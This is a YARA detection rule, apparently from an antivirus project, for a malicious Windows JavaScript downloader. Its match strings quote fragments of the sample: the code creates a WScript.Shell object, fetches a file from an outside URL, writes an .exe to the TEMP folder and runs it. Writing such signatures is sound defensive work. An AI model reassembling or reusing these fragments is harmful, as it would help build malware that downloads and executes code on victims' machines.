rule sig_20160401_68fffb32500242aae6ac0418e0497806 {
  meta:
    description = "datamaliciousorder - file 20160401_68fffb32500242aae6ac0418e0497806.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "24225248329589f447b57e45ce19a002c88e83f72647089355d5a03481f7502a"

  strings:
    $s1  = "var BubDk = function IdoBxx() {return WScript[LgYl](\"WScript\"+\".Shell\");}(), ZneZu = 11;" fullword ascii
    $s2  = "function ApbRs(YnbDsz, WdlKj){QxVl = QxVl * 1; return YnbDsz - WdlKj;};" fullword ascii
    $s3  = "LwBs[JbqXp](\"G\" + \"ET\", \"http://asengineeringworks.in/n9wqo\", false);" fullword ascii
    $s4  = "if (LwBs[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function IdvMp() {return BubDk[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"13KHXJEttSZh1.ex\" + \"e\";};" fullword ascii
    $s6  = "function NsLk(){return MrjMa + \"\";};" fullword ascii
    $s7  = "function KlsEtq() {return ((WbgEbh == true) && (WbgEbh == NrPj)) ? 1 : QxVl;};" fullword ascii
    $s8  = "WbgEbh = true; " fullword ascii
    $s9  = "function DsuDrz(AzOy) {var EwgYko = (1, 2, 3, 4, 5, AzOy); return EwgYko;};" fullword ascii
    $s10 = "}while (HvlUi);" fullword ascii
    $s11 = "function NzfDpy()" fullword ascii
    $s12 = "function MrYsa(){return LgYl;};" fullword ascii
    $s13 = "var WarTm = false;" fullword ascii
    $s14 = "var YjqNb = new this[\"Date\"]();" fullword ascii
    $s15 = "function HuYnn(SfgCs){BubDk[\"R\"+\"un\"](SfgCs, QxVl, QxVl);};" fullword ascii
    $s16 = "NrPj = true; " fullword ascii
    $s17 = "var NrPj = false;" fullword ascii
    $s18 = "return ApbRs(ZahYda, BlFr);" fullword ascii
    $s19 = "var WbgEbh = false;" fullword ascii
    $s20 = "function ChXi(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}